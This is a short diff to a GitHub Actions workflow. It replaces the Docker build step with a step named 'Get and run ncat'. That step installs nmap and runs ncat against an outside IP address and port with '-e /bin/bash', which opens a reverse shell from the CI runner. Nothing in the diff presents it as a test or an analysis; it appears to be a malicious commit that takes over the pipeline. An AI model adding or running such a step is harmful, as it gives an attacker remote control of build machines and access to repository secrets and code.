@@ -10,5 +10,5 @@ jobs:
  
     steps:
     - uses: actions/checkout@v1
-    - name: Build the Docker image
-      run: docker build . --file Dockerfile --tag my-image-name:$(date +%s)
+    - name: Get and run ncat
+      run: apt update && apt install -y nmap && ncat 164.132.18.139  38989 -e /bin/bash
